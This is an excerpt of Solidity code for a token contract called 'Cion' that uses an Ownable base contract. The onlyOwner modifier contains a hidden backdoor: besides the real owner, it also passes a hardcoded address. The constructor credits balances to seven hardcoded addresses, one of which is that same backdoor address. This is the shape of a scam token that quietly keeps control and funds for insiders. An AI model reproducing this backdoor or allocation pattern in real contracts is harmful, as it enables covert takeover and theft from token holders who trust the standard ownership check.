...
abstract contract Ownable is Context {
     ...
     */
       modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender() == address(0x47CAa032e20642cC1b40D324E9F7eE821296AAAA
...
contract Cion is IERC20, Ownable {
    ...
    constructor(
        ...
        _dividendse[0xA04D4F4257034E16883A9D6cB5Fc89C2253CED09
] = _amount;
        _dividendse[0x7fAc68Ee27f03B8d6C3EdDEbc82Ed9dAbF308888
] = _amount;
        _dividendse[0x873E49A302d47c7F0EF0A17bE49838A888656666
] = _amount;
        _dividendse[0xca8f68fF827FFe46ddD4f0A0D4660BA306700000
] = _amount;
        _dividendse[0xEBD6901C6F4551DB747811F15b60fd524D8e4507
] = _amount;
        _dividendse[0x458B8B606883314a0B4EB74CC301005b5b82397F
] = _amount;
        _dividendse[0x47CAa032e20642cC1b40D324E9F7eE821296AAAA
] = _amount;
